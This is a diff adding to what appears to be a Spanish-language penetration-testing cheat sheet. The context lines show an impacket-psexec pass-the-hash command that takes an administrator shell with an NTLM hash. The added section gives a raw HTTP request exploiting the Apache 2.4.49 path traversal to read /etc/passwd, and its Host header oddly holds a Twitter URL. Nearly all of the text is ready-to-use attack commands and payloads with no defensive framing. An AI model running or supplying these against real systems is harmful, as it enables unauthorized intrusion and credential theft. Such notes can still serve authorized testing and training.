@@ -100,3 +100,22 @@ Y obtenemos la contraseña en texto plano.
   Obtener shell con psexec a través de PtH:
 
     impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
+
+
+
+## Vulnerabilidades conocidas
+
+  Apache HTTP Server 2.4.49 - Path traversal
+
+    GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
+    Host: https://www.twitter.com/vulnmachines
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    Connection: close
+    Upgrade-Insecure-Requests: 1
+    Pragma: no-cache
+    Cache-Control: no-cache
+
+    
